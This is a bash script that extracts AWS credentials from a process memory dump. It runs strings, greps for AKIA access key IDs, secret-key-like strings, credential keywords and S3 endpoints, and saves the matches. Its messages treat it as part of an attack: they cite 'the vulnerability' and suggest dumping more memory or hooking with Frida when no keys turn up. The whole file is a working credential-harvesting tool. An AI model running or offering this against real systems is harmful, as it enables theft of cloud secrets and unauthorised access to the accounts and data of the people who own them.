#!/bin/bash

# Quick script to extract credentials from a memory dump file

DUMP_FILE="${1:-heap.dump}"

if [ ! -f "$DUMP_FILE" ]; then
    echo "Usage: $0 <dump_file>"
    echo "Example: $0 heap.dump"
    echo ""
    echo "Looking for dump files..."
    find . -name "*.dump" -type f | head -5
    exit 1
fi

echo "Extracting credentials from: $DUMP_FILE"
echo ""

# Check if strings command exists
if ! command -v strings &> /dev/null; then
    echo "Error: 'strings' command not found."
    echo "Install with: sudo apt-get install binutils"
    exit 1
fi

OUTPUT_DIR="extracted_credentials_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Step 1: Extracting all strings..."
strings "$DUMP_FILE" > "${OUTPUT_DIR}/all_strings.txt" 2>/dev/null
echo "[+] Extracted strings: ${OUTPUT_DIR}/all_strings.txt"
echo ""

echo "[*] Step 2: Searching for AWS Access Key IDs (pattern: AKIA...)..."
grep -E "AKIA[0-9A-Z]{16}" "${OUTPUT_DIR}/all_strings.txt" > "${OUTPUT_DIR}/access_keys.txt" 2>/dev/null
if [ -s "${OUTPUT_DIR}/access_keys.txt" ]; then
    echo "[!] FOUND ACCESS KEYS:"
    cat "${OUTPUT_DIR}/access_keys.txt"
    echo ""
else
    echo "[!] No access keys found with pattern AKIA..."
    echo ""
fi

echo "[*] Step 3: Searching for potential secret keys (40-char base64-like strings)..."
grep -E "[a-zA-Z0-9+/]{38,42}" "${OUTPUT_DIR}/all_strings.txt" | head -50 > "${OUTPUT_DIR}/potential_secrets.txt" 2>/dev/null
SECRET_COUNT=$(wc -l < "${OUTPUT_DIR}/potential_secrets.txt" 2>/dev/null || echo "0")
echo "[+] Found $SECRET_COUNT potential secret keys (first 50 shown)"
echo ""

echo "[*] Step 4: Searching for credential-related keywords..."
grep -iE "access_key|secret|credential|aws|s3|bucket|AKIA" "${OUTPUT_DIR}/all_strings.txt" > "${OUTPUT_DIR}/credential_keywords.txt" 2>/dev/null
KEYWORD_COUNT=$(wc -l < "${OUTPUT_DIR}/credential_keywords.txt" 2>/dev/null || echo "0")
echo "[+] Found $KEYWORD_COUNT lines with credential keywords"
echo ""

echo "[*] Step 5: Searching for S3/bucket related strings..."
grep -iE "s3\.|amazonaws|bucket|endpoint" "${OUTPUT_DIR}/all_strings.txt" > "${OUTPUT_DIR}/s3_info.txt" 2>/dev/null
S3_COUNT=$(wc -l < "${OUTPUT_DIR}/s3_info.txt" 2>/dev/null || echo "0")
echo "[+] Found $S3_COUNT S3-related strings"
echo ""

echo "=== Summary ==="
echo "Output directory: $OUTPUT_DIR"
echo ""
echo "Files created:"
ls -lh "$OUTPUT_DIR" | tail -n +2
echo ""

if [ -s "${OUTPUT_DIR}/access_keys.txt" ]; then
    echo "✅ CREDENTIALS FOUND! Check:"
    echo "   - ${OUTPUT_DIR}/access_keys.txt"
    echo "   - ${OUTPUT_DIR}/credential_keywords.txt"
    echo ""
    echo "To see the full context around access keys:"
    echo "   grep -B5 -A5 'AKIA' ${OUTPUT_DIR}/all_strings.txt | head -30"
else
    echo "⚠️  No access keys found with standard pattern."
    echo ""
    echo "This could mean:"
    echo "  1. Credentials weren't in the dumped memory region"
    echo "  2. Credentials are in a different memory region"
    echo "  3. Credentials were already cleared (unlikely given the vulnerability)"
    echo ""
    echo "Try:"
    echo "  1. Check ${OUTPUT_DIR}/credential_keywords.txt for related strings"
    echo "  2. Dump a larger memory region or different region"
    echo "  3. Use Frida to intercept at function call time"
fi
